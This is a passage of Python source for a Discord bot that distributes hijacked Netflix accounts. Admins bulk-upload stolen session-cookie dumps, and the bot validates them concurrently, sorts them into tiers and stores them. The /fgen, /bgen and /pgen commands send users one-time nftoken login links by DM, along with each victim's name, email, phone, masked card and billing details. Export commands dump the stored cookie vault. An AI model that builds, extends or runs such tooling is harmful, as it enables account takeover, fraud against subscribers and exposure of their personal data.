    return {"ok": False, "reason": f"No active subscription ({info.get('membershipStatus', 'unknown')})."}

def build_links_for_tier(token: str, tier: str) -> list[tuple[str, str]]:
    t = _decode(token)
    if not t:
        return []
    links = [("🖥️ PC Login", f"[Click here](https://netflix.com/?nftoken={t})")]
    if tier in ("booster", "premium"):
        links.append(("📱 Mobile Login", f"[Click here](https://netflix.com/unsupported?nftoken={t})"))
    if tier == "premium":
        links.append(("📺 TV Login", f"[Click here](https://netflix.com/tv8?nftoken={t})"))
    return links
# ==========================================
# 6. CHANNEL GUARD
# ==========================================
def in_channel(channel_id: int):
    def predicate(interaction: discord.Interaction) -> bool:
        if channel_id == 0:
            return True
        if interaction.channel_id != channel_id:
            raise app_commands.CheckFailure(f"❌ Use this command in <#{channel_id}>.")
        return True
    return app_commands.check(predicate)

RESTOCK_IMAGE_URL = "https://kommodo.ai/i/tiDLkbEgU1zCoG3BF16m"   # <-- replace with your actual image

class GeneratorCog(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    # ---------- GENERATION (uses FULL checker) ----------
    async def _generate(self, interaction: discord.Interaction,
                        tier: str, label: str, emoji: str) -> None:
        await interaction.response.defer(ephemeral=True)
        loop = asyncio.get_running_loop()

        for attempt in range(5):
            cookie = await loop.run_in_executor(None, db.pop_cookie, tier)
            if not cookie:
                await interaction.followup.send(
                    f"❌ No **{label}** Netflix accounts in stock. Check back later!",
                    ephemeral=True,
                )
                return

            check = await loop.run_in_executor(None, check_nf_cookie_full, cookie)
            if not check["ok"]:
                if "NFToken" in check.get("reason", ""):
                    # Valid cookie but NFToken failed -> push back
                    await loop.run_in_executor(None, db.push_cookies, tier, [cookie])
                    await interaction.followup.send(
                        f"❌ Something went wrong while generating your account. "
                        f"Please open a ticket in <#{TICKET_CHANNEL_ID}> and report the problem.",
                        ephemeral=True,
                    )
                    continue
                # Dead cookie – discard
                continue

            nft = check.get("nft")
            if not nft:
                continue

            full_info = check.get("full_info", {})
            if str(full_info.get("holdStatus", "")).strip().lower() == "yes":
                # On-hold – discard
                continue

            links = build_links_for_tier(nft["token"], tier)
            link_lines = [f"{lbl}: {url}" for lbl, url in links]
            links_text = "\n".join(link_lines)

            dm_embed = discord.Embed(
                title=f"{emoji} {label} Netflix Account",
                description=(
                    "**📖 How to login:**\n"
                    "Click the links below (they are **one‑time use**).\n"
                    "If you need help, create a ticket in <#1516530741826289796>.\n\n"
                    f"{links_text}"
                ),
                color=discord.Color.red(),
            )
            dm_embed.add_field(name="📌 Status",     value="Subscribed", inline=True)
            if full_info.get("accountOwnerName"):
                dm_embed.add_field(name="👤 Name", value=full_info["accountOwnerName"], inline=True)
            if full_info.get("email"):
                dm_embed.add_field(name="📧 Email", value=full_info["email"], inline=True)
            if full_info.get("countryDisplay"):
                dm_embed.add_field(name="🌍 Country", value=full_info["countryDisplay"], inline=True)
            dm_embed.add_field(name="📦 Plan",       value=check.get("plan", "Unknown"), inline=True)
            if full_info.get("memberSince"):
                dm_embed.add_field(name="📅 Member Since", value=full_info["memberSince"], inline=True)
            if full_info.get("nextBillingDate"):
                dm_embed.add_field(name="🗓️ Next Billing", value=full_info["nextBillingDate"], inline=True)
            if full_info.get("paymentMethodType"):
                dm_embed.add_field(name="💳 Payment", value=full_info["paymentMethodType"], inline=True)
            if full_info.get("maskedCard"):
                dm_embed.add_field(name="💳 Card", value=full_info["maskedCard"], inline=True)
            if full_info.get("phoneDisplay"):
                dm_embed.add_field(name="📱 Phone", value=full_info["phoneDisplay"], inline=True)
            dm_embed.add_field(name="🎞️ Quality",    value=(check.get("quality") or "").title(), inline=True)
            if check.get("maxStreams"):
                dm_embed.add_field(name="📺 Streams", value=check["maxStreams"], inline=True)
            if full_info.get("planPrice"):
                dm_embed.add_field(name="💰 Price", value=full_info["planPrice"], inline=True)
            if full_info.get("holdStatus") is not None:
                dm_embed.add_field(name="⏸️ Hold Status", value=full_info["holdStatus"], inline=True)
            if full_info.get("showExtraMemberSection"):
                dm_embed.add_field(name="👥 Extra Member", value=full_info["showExtraMemberSection"], inline=True)
            if full_info.get("emailVerified"):
                dm_embed.add_field(name="✅ Email Verified", value=full_info["emailVerified"], inline=True)
            if check.get("status"):
                dm_embed.add_field(name="🛡️ Membership Status", value=check["status"].replace("_", " ").title(), inline=True)
            if full_info.get("profilesDisplay"):
                profile_count = len(full_info["profilesDisplay"].split(", "))
                dm_embed.add_field(name=f"🎭 Profiles ({profile_count})", value=full_info["profilesDisplay"], inline=False)

            dm_embed.set_footer(text=f"{label} by INFOGAMER | Vouch in <#{VOUCH_CHANNEL_ID}>")

            try:
                await interaction.user.send(embed=dm_embed)
                dm_success = True
            except discord.Forbidden:
                dm_success = False

            if not dm_success:
                # Push cookie back because DM failed
                await loop.run_in_executor(None, db.push_cookies, tier, [cookie])
                await interaction.followup.send(
                    "❌ I couldn't send you a DM. Please enable DMs and try again.",
                    ephemeral=True,
                )
                return

            ephemeral_embed = discord.Embed(
                title=f"{emoji} {label} Netflix Generated!",
                description="Account details have been sent to your DMs. Check your DM for login links.",
                color=discord.Color.green(),
            )
            ephemeral_embed.set_footer(text=f"Expires: {nft.get('expires_at_utc', 'Unknown')} | One‑time use")
            await interaction.followup.send(embed=ephemeral_embed, ephemeral=True)

            public_embed = discord.Embed(
                title="🎉 Netflix Account Generated!",
                description=(
                    f"{interaction.user.mention} generated a **{label}** Netflix account.\n"
                    f"Check your DMs for login links.\n\n"
                    f"Please vouch in <#{VOUCH_CHANNEL_ID}> if you received a working account!"
                ),
                color=discord.Color.green(),
            )
            await interaction.followup.send(embed=public_embed, ephemeral=False)
            return

        await interaction.followup.send(
            "❌ All available cookies were expired. Ask an admin to `/restock`!",
            ephemeral=True,
        )

    @app_commands.command(name="fgen", description="🆓 Generate a Free Netflix account")
    @in_channel(FGEN_CHANNEL_ID)
    @app_commands.checks.cooldown(1, 86400, key=lambda i: i.user.id if i.user.id != OWNER_ID else object())
    async def fgen(self, interaction: discord.Interaction):
        await self._generate(interaction, "free", "Free", "🆓")

    @app_commands.command(name="bgen", description="🚀 Generate a Booster Netflix account")
    @in_channel(BGEN_CHANNEL_ID)
    @app_commands.checks.cooldown(1, 28800, key=lambda i: i.user.id if i.user.id != OWNER_ID else object())
    async def bgen(self, interaction: discord.Interaction):
        await self._generate(interaction, "booster", "Booster", "🚀")

    @app_commands.command(name="pgen", description="💎 Generate a Premium Netflix account")
    @in_channel(PGEN_CHANNEL_ID)
    @app_commands.checks.cooldown(1, 21600, key=lambda i: i.user.id if i.user.id != OWNER_ID else object())
    async def pgen(self, interaction: discord.Interaction):
        await self._generate(interaction, "premium", "Premium", "💎")

    # ---------- RESTOCK (uses FAST checker) ----------
    @app_commands.command(
        name="restock",
        description="[ADMIN] Upload up to 5 files (.txt/.json/.zip) — auto-extracted, checked & sorted"
    )
    @app_commands.checks.has_permissions(administrator=True)
    @in_channel(ADMIN_CHANNEL_ID)
    async def restock(
        self,
        interaction: discord.Interaction,
        file1: discord.Attachment,
        file2: discord.Attachment | None = None,
        file3: discord.Attachment | None = None,
        file4: discord.Attachment | None = None,
        file5: discord.Attachment | None = None,
    ):
        await interaction.response.defer(ephemeral=True)

        attachments = [f for f in (file1, file2, file3, file4, file5) if f is not None]
        ALLOWED = (".txt", ".json", ".zip")
        bad = [f.filename for f in attachments if not f.filename.lower().endswith(ALLOWED)]
        if bad:
            return await interaction.followup.send(
                f"❌ Only `.txt` / `.json` / `.zip` files accepted. Rejected: {', '.join(bad)}",
                ephemeral=True,
            )

        all_bundles = []
        file_names = []
        for att in attachments:
            try:
                raw_bytes = await att.read()
            except Exception as e:
                return await interaction.followup.send(f"❌ Could not read `{att.filename}`: {e}", ephemeral=True)

            if att.filename.lower().endswith(".zip"):
                try:
                    with zipfile.ZipFile(io.BytesIO(raw_bytes)) as zf:
                        inner_files = [n for n in zf.namelist()
                                       if not n.endswith("/") and n.lower().endswith((".txt", ".json"))
                                       and not os.path.basename(n).startswith(".")]
                        if not inner_files:
                            file_names.append(f"`{att.filename}` → (no valid files inside)")
                            continue
                        for name in inner_files:
                            raw = zf.read(name).decode("utf-8", errors="ignore")
                            bundles = extract_netflix_cookie_bundles(raw)
                            all_bundles.extend((name, b) for b in bundles)
                            file_names.append(f"`{att.filename}/{name}` ({len(bundles)} accounts)")
                except zipfile.BadZipFile:
                    file_names.append(f"`{att.filename}` → (invalid zip)")
                except Exception as e:
                    file_names.append(f"`{att.filename}` → (zip error: {e})")
            else:
                raw = raw_bytes.decode("utf-8", errors="ignore")
                bundles = extract_netflix_cookie_bundles(raw)
                all_bundles.extend((att.filename, b) for b in bundles)
                file_names.append(f"`{att.filename}` ({len(bundles)} accounts)")

        if not all_bundles:
            return await interaction.followup.send("❌ No valid Netflix accounts found.", ephemeral=True)

        loop = asyncio.get_running_loop()

        # Deduplication
        existing_ids = await loop.run_in_executor(None, db.existing_netflix_ids)
        seen_ids = set(existing_ids)
        unique_cookies = []
        dupes = 0
        for fname, bundle in all_bundles:
            nid = bundle["cookies"].get("NetflixId", "").strip()
            if nid and nid in seen_ids:
                dupes += 1
            else:
                unique_cookies.append((bundle["netscape_text"], fname))
                if nid:
                    seen_ids.add(nid)

        total = len(unique_cookies)
        if total == 0:
            return await interaction.followup.send("❌ All accounts were duplicates.", ephemeral=True)

        progress_embed = discord.Embed(
            title="⏳ Restocking Netflix Accounts",
            description=f"Scanned: 0/{total}\n[{'░'*20}] 0%",
            color=0x2F3136
        )
        progress_embed.set_footer(text="Please wait…")
        progress_msg = await interaction.followup.send(embed=progress_embed, ephemeral=True)

        MAX_WORKERS = 100
        SEM_LIMIT = 100
        executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
        sem = asyncio.Semaphore(SEM_LIMIT)
        completed = 0
        lock = asyncio.Lock()

        async def _check(cookie_text, fname):
            nonlocal completed
            async with sem:
                res = await loop.run_in_executor(executor, check_nf_cookie_fast, cookie_text)
            async with lock:
                nonlocal completed
                completed += 1
                if completed % 50 == 0 or completed == total:
                    pct = int(completed / total * 100)
                    bar = "█" * int(completed / total * 20) + "░" * (20 - int(completed / total * 20))
                    new_embed = discord.Embed(
                        title="⏳ Restocking Netflix Accounts",
                        description=f"Scanned: {completed}/{total}\n[{bar}] {pct}%",
                        color=0x2F3136
                    )
                    new_embed.set_footer(text="Please wait…")
                    await progress_msg.edit(embed=new_embed)
            return res

        results = await asyncio.gather(*[_check(cookie, fname) for cookie, fname in unique_cookies])
        executor.shutdown(wait=False)

        sorted_cookies = {"free": [], "booster": [], "premium": []}
        dead = 0
        for (cookie_text, _), res in zip(unique_cookies, results):
            if res["ok"]:
                tier = classify_tier(res.get("plan"), res.get("quality"))
                sorted_cookies[tier].append(cookie_text)
            else:
                dead += 1

        data = await loop.run_in_executor(None, db.get_all)
        for t in ("free", "booster", "premium"):
            data["nf"][t].extend(sorted_cookies[t])
        save_ok = await loop.run_in_executor(None, db.save, data)
        final_stock = await loop.run_in_executor(None, db.stock)

        files_value = "\n".join(file_names)
        if len(files_value) > 900:
            files_value = files_value[:900] + "\n…"

        admin_embed = discord.Embed(
            title="✅ Restock Complete — Auto-sorted",
            color=discord.Color.green() if save_ok else discord.Color.orange(),
        )
        admin_embed.add_field(name="📂 Files", value=files_value, inline=False)
        admin_embed.add_field(name="💎 Premium Added", value=f"`{len(sorted_cookies['premium'])}`", inline=True)
        admin_embed.add_field(name="🚀 Booster Added", value=f"`{len(sorted_cookies['booster'])}`", inline=True)
        admin_embed.add_field(name="🆓 Free Added", value=f"`{len(sorted_cookies['free'])}`", inline=True)
        admin_embed.add_field(name="💀 Dead Filtered", value=f"`{dead}`", inline=True)
        admin_embed.add_field(name="♻️ Duplicates Skipped", value=f"`{dupes}`", inline=True)
        admin_embed.add_field(name="📊 Total Scanned", value=f"`{len(all_bundles)}`", inline=True)
        admin_embed.add_field(name="👤 Restocked by", value=interaction.user.mention, inline=False)
        if not save_ok:
            admin_embed.add_field(name="⚠️ Warning", value="Supabase write may have failed.", inline=False)

        await progress_msg.edit(content=None, embed=admin_embed)

        restock_channel = self.bot.get_channel(RESTOCK_CHANNEL_ID)
        if restock_channel:
            pub_embed = discord.Embed(
                title="✅ Netflix Restock Successfully",
                color=0xd2af26,
                description=(
                    f"*🆓 Free Stock added = {len(sorted_cookies['free'])}*\n"
                    f"*🌟 Boosters Stock added = {len(sorted_cookies['booster'])}*\n"
                    f"*👑 Premium Stock added = {len(sorted_cookies['premium'])}*\n\n"
                    f"**Total Stock**\n"
                    f"*🆓 Free Stock = {final_stock['free']}*\n"
                    f"*🌟 Boosters Stock = {final_stock['booster']}*\n"
                    f"*👑 Premium Stock = {final_stock['premium']}*"
                ),
            )
            pub_embed.add_field(name="📊 Total Processed", value=f"`{len(all_bundles)}`", inline=True)
            pub_embed.add_field(name="👤 Restocked by", value=interaction.user.mention, inline=True)
            pub_embed.add_field(name="✅ Valid Added", value=f"`{sum(len(v) for v in sorted_cookies.values())}`", inline=True)
            pub_embed.add_field(name="💀 Dead", value=f"`{dead}`", inline=True)
            pub_embed.add_field(name="♻️ Dupes", value=f"`{dupes}`", inline=True)
            pub_embed.set_footer(text="⚠️ All Accounts Working With No Errors")
            pub_embed.set_image(url=RESTOCK_IMAGE_URL)
            try:
                await restock_channel.send(embed=pub_embed)
            except Exception as e:
                await interaction.followup.send(f"⚠️ Failed to notify restock channel: {e}", ephemeral=True)

    # ---------- STOCK COMMAND ----------
    @app_commands.command(name="stock", description="📦 Check Netflix account stock levels")
    @in_channel(ADMIN_CHANNEL_ID)
    async def stock(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        counts = await asyncio.get_running_loop().run_in_executor(None, db.stock)
        embed = discord.Embed(title="📦 Netflix Account Vault", color=discord.Color.dark_theme())
        for label, key in [("💎 Premium", "premium"), ("🚀 Booster", "booster"), ("🆓 Free", "free")]:
            c = counts[key]
            embed.add_field(name=label, value=f"{'🟢' if c > 0 else '🔴'} **{c}** account(s)", inline=False)
        embed.set_footer(text=f"Total: {sum(counts.values())} accounts")
        await interaction.followup.send(embed=embed, ephemeral=True)

    # ---------- /removecookies ----------
    @app_commands.command(name="removecookies", description="[ADMIN] Remove accounts by uploading a file with cookies to delete")
    @app_commands.checks.has_permissions(administrator=True)
    @in_channel(ADMIN_CHANNEL_ID)
    async def removecookies(self, interaction: discord.Interaction, file: discord.Attachment):
        await interaction.response.defer(ephemeral=True)
        if not file.filename.lower().endswith((".txt", ".json")):
            return await interaction.followup.send("❌ Only `.txt` / `.json` files accepted.", ephemeral=True)
        try:
            raw_bytes = await file.read()
            raw = raw_bytes.decode("utf-8", errors="ignore")
        except Exception as e:
            return await interaction.followup.send(f"❌ Could not read `{file.filename}`: {e}", ephemeral=True)
        bundles = extract_netflix_cookie_bundles(raw)
        if not bundles:
            return await interaction.followup.send("❌ No valid Netflix accounts found.", ephemeral=True)
        ids_to_remove = set()
        for bundle in bundles:
            nid = bundle["cookies"].get("NetflixId", "").strip()
            if nid:
                ids_to_remove.add(nid)
        if not ids_to_remove:
            return await interaction.followup.send("❌ No NetflixId could be extracted.", ephemeral=True)
        loop = asyncio.get_running_loop()
        data = await loop.run_in_executor(None, db.get_all)
        removed = 0
        for tier in ("free", "booster", "premium"):
            new_list = []
            for ct in data["nf"][tier]:
                nid = netscape_to_dict(ct).get("NetflixId", "").strip()
                if nid in ids_to_remove:
                    removed += 1
                else:
                    new_list.append(ct)
            data["nf"][tier] = new_list
        if removed == 0:
            return await interaction.followup.send("ℹ️ No matching accounts found.", ephemeral=True)
        success = await loop.run_in_executor(None, db.save, data)
        embed = discord.Embed(
            title="🗑️ Accounts Removed",
            description=f"{'✅' if success else '⚠️'} Removed **{removed}** account(s).",
            color=discord.Color.green() if success else discord.Color.orange()
        )
        embed.add_field(name="📂 File", value=file.filename, inline=False)
        await interaction.followup.send(embed=embed, ephemeral=True)

    # ---------- /export ----------
    @app_commands.command(name="export", description="[ADMIN] Export all vault accounts as a tier-wise zip")
    @app_commands.checks.has_permissions(administrator=True)
    @in_channel(ADMIN_CHANNEL_ID)
    async def export(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        loop = asyncio.get_running_loop()
        data = await loop.run_in_executor(None, db.get_all)
        tiers = {"free": data["nf"].get("free", []), "booster": data["nf"].get("booster", []), "premium": data["nf"].get("premium", [])}
        total = sum(len(v) for v in tiers.values())
        if total == 0:
            return await interaction.followup.send("❌ Vault is empty.", ephemeral=True)
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
            for tname, cookies in tiers.items():
                if cookies:
                    zf.writestr(f"{tname}.txt", "\n\n".join(cookies))
        zip_buffer.seek(0)
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        file = discord.File(fp=zip_buffer, filename=f"vault_export_{timestamp}.zip")
        try:
            await interaction.user.send(
                f"📦 **Vault Export**\nTotal: **{total}** accounts\n"
                f"Premium {len(tiers['premium'])}, Booster {len(tiers['booster'])}, Free {len(tiers['free'])}",
                file=file
            )
            await interaction.followup.send(embed=discord.Embed(
                title="📤 Vault Exported",
                description=f"✅ **{total}** accounts exported to your DMs.",
                color=discord.Color.blue()
            ), ephemeral=True)
        except discord.Forbidden:
            await interaction.followup.send("❌ I couldn't DM you. Enable DMs and try again.", ephemeral=True)

    # ---------- /exportandclear ----------
    @app_commands.command(name="exportandclear", description="[ADMIN] Export all vault accounts (tier-wise zip) and then empty the vault")
    @app_commands.checks.has_permissions(administrator=True)
    @in_channel(ADMIN_CHANNEL_ID)
    async def exportandclear(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        loop = asyncio.get_running_loop()
        data = await loop.run_in_executor(None, db.get_all)
        tiers = {"free": data["nf"].get("free", []), "booster": data["nf"].get("booster", []), "premium": data["nf"].get("premium", [])}
        total = sum(len(v) for v in tiers.values())
        if total == 0:
            return await interaction.followup.send("❌ Vault is already empty.", ephemeral=True)
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
            for tname, cookies in tiers.items():
                if cookies:
                    zf.writestr(f"{tname}.txt", "\n\n".join(cookies))
        zip_buffer.seek(0)
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        file = discord.File(fp=zip_buffer, filename=f"vault_export_{timestamp}.zip")
        try:
            await interaction.user.send(
                f"📦 **Vault Export**\nTotal: **{total}** accounts\n"
                f"Premium {len(tiers['premium'])}, Booster {len(tiers['booster'])}, Free {len(tiers['free'])}",
                file=file
            )
        except discord.Forbidden:
            return await interaction.followup.send("❌ I couldn't DM you. Enable DMs and try again.", ephemeral=True)
        for t in ("free", "booster", "premium"):
            data["nf"][t] = []
        success = await loop.run_in_executor(None, db.save, data)
        embed = discord.Embed(
            title="🗑️ Vault Cleared",
            description=f"✅ **{total}** account(s) removed. Zip sent to your DMs.",
            color=discord.Color.green() if success else discord.Color.orange()
        )
        await interaction.followup.send(embed=embed, ephemeral=True)
        log_ch = self.bot.get_channel(RESTOCK_CHANNEL_ID)
        if log_ch:
            try:
                await log_ch.send(f"🗑️ **Vault cleared** by {interaction.user.mention} — {total} accounts removed.")
            except:
                pass

# ==========================================
# 8. BOT CLASS
# ==========================================
class NetflixBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        super().__init__(command_prefix="!", intents=intents)
        self.tree.on_error = self._on_error

    async def setup_hook(self):
        await self.add_cog(GeneratorCog(self))
        if os.environ.get("FORCE_SYNC", "").lower() == "true":
            guild_id = os.environ.get("DISCORD_GUILD_ID", "").strip()
            if guild_id:
                g = discord.Object(id=int(guild_id))
                self.tree.copy_global_to(guild=g)
                await self.tree.sync(guild=g)
                print(f"[Bot] Commands synced to guild {guild_id}.")
            else:
                await self.tree.sync()
                print("[Bot] Commands synced globally.")
        else:
            print("[Bot] Skipping command sync (use FORCE_SYNC=true to re-sync).")

    async def on_ready(self):
        print(f"[Bot] ✅ Logged in as {self.user} (ID: {self.user.id})")
        print("[Bot] 🟢 Your bot is Live")
        await self.change_presence(activity=discord.Game(name="Netflix 🎬"))

    async def _on_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError):
        async def reply_embed(embed: discord.Embed):
            try:
                if interaction.response.is_done():
                    await interaction.followup.send(embed=embed, ephemeral=True)
                else:
                    await interaction.response.send_message(embed=embed, ephemeral=True)
            except Exception:
                pass

        if isinstance(error, app_commands.CheckFailure):
            msg = str(error)
            emb = discord.Embed(description=msg if msg and "check functions" not in msg.lower()
                                else "❌ You can't use this command here.",
                                color=discord.Color.orange())
            await reply_embed(emb)
        elif isinstance(error, app_commands.CommandOnCooldown):
            total_sec = int(error.retry_after)
            h, rem = divmod(total_sec, 3600)
            m, s = divmod(rem, 60)
            parts = []
            if h:
                parts.append(f"{h}h")
            if m:
                parts.append(f"{m}m")
            if s or not parts:
                parts.append(f"{s}s")
            cd_text = " ".join(parts)
            emb = discord.Embed(
                title="⏳ Cooldown",
                description=f"You can use this command again in **{cd_text}**.",
                color=discord.Color.blue()
            )
            await reply_embed(emb)
        elif isinstance(error, app_commands.MissingPermissions):
            emb = discord.Embed(description="❌ You need **Administrator** permission.", color=discord.Color.red())
            await reply_embed(emb)
        else:
            print(f"[Bot] Error: {type(error).__name__}: {error}")
            emb = discord.Embed(description=f"⚠️ Unexpected error: `{type(error).__name__}`", color=discord.Color.red())
            await reply_embed(emb)

# ==========================================
# 9. ENTRY POINT (with retry logic for 429)
# ==========================================
def main():
    token = os.environ.get("DISCORD_BOT_TOKEN", "").strip()
    if not token:
        sys.exit("[Bot] FATAL: DISCORD_BOT_TOKEN is not set.")
    if not os.environ.get("SUPABASE_URL") or not os.environ.get("SUPABASE_KEY"):
        sys.exit("[Bot] FATAL: SUPABASE_URL and SUPABASE_KEY must be set.")

    print("[Bot] Starting Netflix Discord Bot…")
    print(f"[Bot] Channels — ADMIN:{ADMIN_CHANNEL_ID} FGEN:{FGEN_CHANNEL_ID} "
          f"BGEN:{BGEN_CHANNEL_ID} PGEN:{PGEN_CHANNEL_ID} RESTOCK:{RESTOCK_CHANNEL_ID}")
    if OWNER_ID:
        print(f"[Bot] Owner bypass enabled for ID: {OWNER_ID}")

    bot = NetflixBot()
    max_retries = 5
    for attempt in range(max_retries):
        try:
            bot.run(token)
            break
        except discord.LoginFailure:
            sys.exit("[Bot] FATAL: Invalid DISCORD_BOT_TOKEN.")
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = float(e.response.headers.get("Retry-After", 60))
                wait = retry_after + 5
                print(f"[Bot] Rate limited (429). Waiting {wait:.0f} seconds before retry...")
                import time
                time.sleep(wait)
            else:
                sys.exit(f"[Bot] FATAL HTTP error: {e}")
        except Exception as e:
            sys.exit(f"[Bot] FATAL: {e}")

if __name__ == "__main__":
    main()
